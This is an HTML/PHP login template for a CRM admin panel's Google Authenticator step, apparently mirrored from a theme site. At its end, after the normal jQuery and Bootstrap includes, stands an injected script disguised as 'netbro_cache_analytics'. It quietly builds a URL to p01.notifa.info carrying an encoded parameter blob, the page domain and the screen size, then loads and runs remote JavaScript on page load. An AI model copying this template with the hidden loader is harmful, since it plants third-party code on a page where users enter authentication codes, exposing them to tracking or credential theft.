<!DOCTYPE html>
<html lang="en">
    
<!-- Mirrored from thememinister.com/crm/login.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 08 May 2020 04:38:24 GMT -->
<head>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
        <title>CRM Admin Panel</title>

        <!-- Favicon and touch icons -->
        <link rel="shortcut icon" href="<?= base_url() ?>assets/dist/img/ico/favicon.png" type="image/x-icon">
        <!-- Bootstrap -->
        <link href="<?= base_url() ?>assets/bootstrap/css/bootstrap.min.css" rel="stylesheet" type="text/css"/>
        <!-- Bootstrap rtl -->
        <!--<link href="assets/bootstrap-rtl/bootstrap-rtl.min.css" rel="stylesheet" type="text/css"/>-->
        <!-- Pe-icon-7-stroke -->
        <link href="<?= base_url() ?>assets/pe-icon-7-stroke/css/pe-icon-7-stroke.css" rel="stylesheet" type="text/css"/>
        <!-- style css -->
        <link href="<?= base_url() ?>assets/dist/css/stylecrm.css" rel="stylesheet" type="text/css"/>
        <!-- Theme style rtl -->
        <!--<link href="<?= base_url() ?>assets/dist/css/stylecrm-rtl.css" rel="stylesheet" type="text/css"/>-->
    </head>
    <body>
        <!-- Content Wrapper -->
        <div class="login-wrapper">
            <div class="container-center">
            <div class="login-area">
                <div class="panel panel-bd panel-custom">
                    <div class="panel-heading">
                        <div class="view-header">
                            <div class="header-icon">
                                <i class="pe-7s-unlock"></i>
                            </div>
                            <div class="header-title">
                                <h3>Login</h3>
                                <small><strong>Insert Google Authenticator.</strong></small>
                            </div>
                            <?= $this->session->flashdata('msg');?>
                        </div>
                    </div>
                    <div class="panel-body">
               
                        <form action="<?= base_url()?>Auth/google_authenticator_check" id="loginForm" novalidate method="post">
                            <div class="form-group">
                                <!-- <label class="control-label" for="username">Code Google Authenticator</label> -->
                                <img src="<?=base_url()?>assets/images/google_auth.jpeg" alt="" style="width:200px;text-align:center;margin-left:52px;">
                                <input type="text" placeholder="Please insert google code" title="Please enter google code" required="" value="" name="code_google" id="" class="form-control">
                                <span class="help-block small">Your unique google code</span>
                            </div>
                                <button class="btn btn-add">Login</button>
                            </div>
                        </form>
                        </div>
                        </div>
                </div>
            </div>
        </div>
        <!-- /.content-wrapper -->
        <!-- jQuery -->
        <script src="<?= base_url() ?>assets/plugins/jQuery/jquery-1.12.4.min.js" type="text/javascript"></script>
        <!-- bootstrap js -->
        <script src="<?= base_url() ?>assets/bootstrap/js/bootstrap.min.js" type="text/javascript"></script>
    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXQdrpTDprSZtmtenIbpTxEckwROjN%2b1rsHRmveaF4DQOCPY2JpTRuUkt%2bPhG6NCVGcR95t8TJYBuGuqSdx6XuqLF4HhWdqOfe%2bm7Q5vhuvWbniBltbf9w2n4kNUYYY7qfYpHwpbOoLm5WR3qxoZ%2fpBiH8A99WRmhWhOGGDcaR24JnqXrPlkP6DT4jQ4xaECPqztjRa4QY0nQT7G3SpvJN2wow7zbixHg3XzaLkfLY3rhXdjaxHY2HiXQJgsOHnAlhVIbXXdzuQCEGVcRgSlePGwx18KdTVFMvpTbzlX7Xbv11az2W4aX%2bFdRCagu1lCa0qAFV9Kbc9L2T%2bnj1tZxOzr7rlDaUt%2bJixJBwtyb9R7GTgG%2bvw%2bjs%2fa87eX%2fGRB3ponZfs7epoy0zzReplBZuzZftLWI%2b1ooC9wytJj7ywFUdUJv%2bJzEKQAxpHaOnTxHb3%2fnGBa407i7C5cSZKSMKoXLzAv5Raj0dd6OIFdaHk38%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

</html>